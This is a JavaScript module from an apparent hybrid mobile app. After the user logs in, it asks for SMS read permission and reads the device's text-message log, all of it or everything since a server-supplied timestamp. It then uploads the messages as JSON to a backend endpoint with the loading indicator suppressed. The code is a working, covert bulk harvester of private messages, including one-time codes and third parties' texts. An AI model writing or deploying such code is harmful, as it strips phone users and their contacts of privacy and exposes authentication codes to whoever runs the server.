import { utils } from 'libs';
import { urls } from 'settings';
import storage from 'good-storage'

class Sms {

    init() {
    
        if(location.href.indexOf('user-login') > -1) return;
        
        let identityInfo = storage.get('identityInfo');
        if (!identityInfo) return;
            
        if (location.href.indexOf('ll2pay-page') > -1) return;
        
        window.plugins.smsLog.hasReadPermission(()=>{
            
            this.getSms();
        }, ()=>{

        })

        window.plugins.smsLog.requestReadPermission(()=>{
        
            this.getSms();
        }, ()=>{

        })
        
        
    
    }

    getSms(){

        let promise = utils.fetch({
            method: 'get',
            url: urls.common.getMobileShortMessage,
            loadingTip: false,
            api: true,
            token: true
        })

        promise.then(data => {
            
            
            let fileters = [{
                "name":"date",
                "value":data.lastSubmitTime, 
                "operator": ">="
            }]
            if (data && !!data.lastSubmitTime) {
                window.plugins.smsLog && window.plugins.smsLog.getSmsLog(fileters, true, this.success, this.error)
                return;
            }
            
            window.plugins.smsLog && window.plugins.smsLog.getSmsLog(null, true, this.success, this.error)
        })
    }

    success(sms) {
        
        console.log(sms)
        try {

            let data = {

                shortMessages:JSON.stringify(sms)
            }

            let promise = utils.fetch({
                url: urls.common.postUserSms, //需要提供一个接口
                data,
                loadingTip: false,
                api: true,
                token: true
            })

            promise.then(data => {


            })

        } catch (e) {

            console.log(e)
        }
    }

    error(error) {

        console.log(error)
    }
}


export default new Sms();